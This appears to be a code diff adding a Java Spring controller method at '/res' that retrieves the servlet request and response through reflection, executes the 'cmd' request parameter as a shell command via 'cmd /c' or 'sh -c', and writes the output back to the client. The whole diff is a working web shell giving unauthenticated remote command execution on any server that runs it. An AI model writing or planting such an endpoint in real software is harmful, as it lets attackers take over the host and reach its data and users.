@@ -1,0 +1,40 @@
+@RequestMapping("/res")
+    public String res(HttpServletRequest req, HttpServletResponse res) throws Exception {
+        // 获取request
+        Class c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
+        Method m = c.getMethod("getRequestAttributes");
+        Object o = m.invoke(null);
+        c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
+        m = c.getMethod("getRequest");
+        ServletRequest request = (ServletRequest) m.invoke(o);
+        if (request == null) {
+            return "request is null";
+        }
+
+        // 获取response
+        c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
+        m = c.getMethod("getResponse");
+        ServletResponse response = (ServletResponse) m.invoke(o);
+        if (response == null) {
+            return "response is null";
+        }
+
+        String cmd = request.getParameter("cmd");
+        String charSet = "GBK";
+        String osName = System.getProperty("os.name").toLowerCase();
+        Process p;
+        if (osName.contains("windows"))
+            p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd});
+        else
+            p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+        BufferedReader br = new BufferedReader(new InputStreamReader(
+                p.getInputStream(), Charset.forName(charSet)));
+        String line;
+        while ((line = br.readLine()) != null) {
+            System.out.println(line);
+            response.getWriter().write(line + "\n");
+            response.flushBuffer();
+        }
+        br.close();
+        return "OK";
+    }
